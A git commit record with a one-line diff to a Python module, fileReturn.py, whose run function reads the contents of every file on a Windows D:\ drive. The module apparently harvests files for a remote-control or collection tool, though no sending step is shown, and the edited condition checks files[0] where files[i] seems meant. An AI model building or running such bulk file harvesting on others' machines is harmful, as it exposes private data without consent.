3a4641742160ffde36cf9dcdc1469eba0aad7159
linallen <315793290@qq.com>
2017-07-03 20:43:07 +0800

    test

--- modules/fileReturn.py
+++ modules/fileReturn.py
@@ -7,7 +7,7 @@ def run(**args):
 	files = os.listdir("D:\\\\")
 	for i in range(0,len(files)):
 		if files[i] not in sys.argv[0]:
-			if os.path.isdir(files[i])==False:
+			if os.path.isdir(files[i])==False and files[0]!='$':
 				fp=open(files[i],'r')
 				content=fp.read()
 				fp.close()
